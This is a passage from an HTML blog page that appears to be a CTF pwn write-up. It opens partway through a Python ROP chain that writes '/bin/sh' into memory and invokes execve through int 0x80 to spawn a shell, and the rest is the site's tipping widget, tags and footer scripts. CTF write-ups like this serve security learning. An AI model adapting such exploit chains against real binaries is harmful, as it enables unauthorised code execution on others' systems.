+</span></span><span style="display:flex;"><span>rebase_0 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">lambda</span> x : p(x <span style="color:#ff79c6">+</span> IMAGE_BASE_0)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> rebase_0(<span style="color:#bd93f9">0x00072e06</span>) <span style="color:#6272a4"># 0x080bae06: pop eax; ret; </span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;/bin&#39;</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> rebase_0(<span style="color:#bd93f9">0x0002682a</span>) <span style="color:#6272a4"># 0x0806e82a: pop edx; ret; </span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> rebase_0(<span style="color:#bd93f9">0x000a3060</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> rebase_0(<span style="color:#bd93f9">0x0005215d</span>) <span style="color:#6272a4"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> rebase_0(<span style="color:#bd93f9">0x00072e06</span>) <span style="color:#6272a4"># 0x080bae06: pop eax; ret; </span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#39;/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> rebase_0(<span style="color:#bd93f9">0x0002682a</span>) <span style="color:#6272a4"># 0x0806e82a: pop edx; ret; </span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> rebase_0(<span style="color:#bd93f9">0x000a3064</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> rebase_0(<span style="color:#bd93f9">0x0005215d</span>) <span style="color:#6272a4"># 0x0809a15d: mov dword ptr [edx], eax; ret;</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;I&#39;</span>, pop_edx_ecx_ebx)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> p(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> p(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> rebase_0(<span style="color:#bd93f9">0x000a3060</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> rebase_0(<span style="color:#bd93f9">0x00072e06</span>) <span style="color:#6272a4"># 0x080bae06: pop eax; ret; </span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> p(<span style="color:#bd93f9">0x0000000b</span>)
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">+=</span> rebase_0(<span style="color:#bd93f9">0x00026ef0</span>) <span style="color:#6272a4"># 0x0806eef0: int 0x80; ret; </span>
+</span></span></code></pre></div>
+
+                
+                
+<div class="entry-shang text-center">
+    
+	    <p>「真诚赞赏，手留余香」</p>
+	
+	<button class="zs show-zs btn btn-bred">赞赏支持</button>
+</div>
+<div class="zs-modal-bg"></div>
+<div class="zs-modal-box">
+	<div class="zs-modal-head">
+		<button type="button" class="close">×</button>
+		<span class="author"><a href="https://mrbelieve.tech"><img src="/img/favicon.png" />Mr.Be1ieVe&#39;s Treasure</a></span>
+        
+	        <p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+		
+ 
+	</div>
+	<div class="zs-modal-body">
+		<div class="zs-modal-btns">
+			<button class="btn btn-blink" data-num="2">2元</button>
+			<button class="btn btn-blink" data-num="5">5元</button>
+			<button class="btn btn-blink" data-num="10">10元</button>
+			<button class="btn btn-blink" data-num="50">50元</button>
+			<button class="btn btn-blink" data-num="100">100元</button>
+			<button class="btn btn-blink" data-num="1">任意金额</button>
+		</div>
+		<div class="zs-modal-pay">
+			<button class="btn btn-bred" id="pay-text">2元</button>
+			<p>使用<span id="pay-type">微信</span>扫描二维码完成支付</p>
+			<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+		</div>
+	</div>
+	<div class="zs-modal-footer">
+		<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+		<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
+	</div>
+</div>
+<script type="text/javascript" src="/js/reward.js"></script>
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/leak_canary-others_babystack/" data-toggle="tooltip" data-placement="top" title="leak_canary-others_babystack">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/post/oneshot_tjctf_2016/" data-toggle="tooltip" data-placement="top" title="oneshot_tjctf_2016">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/awd" title="awd">
+                            awd
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/buu" title="buu">
+                            buu
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/hackthebox" title="hackthebox">
+                            hackthebox
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/linux%E4%BD%BF%E7%94%A8" title="linux使用">
+                            linux使用
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/xray" title="xray">
+                            xray
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0" title="专业学习">
+                            专业学习
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" title="基础知识">
+                            基础知识
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" title="学习笔记">
+                            学习笔记
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:mr_believe@outlook.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/MrBe1ieVe">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="Mr.Be1ieVe&#39;s Treasure" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Mr.Be1ieVe&#39;s Treasure 2022
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+</body>
+</html>
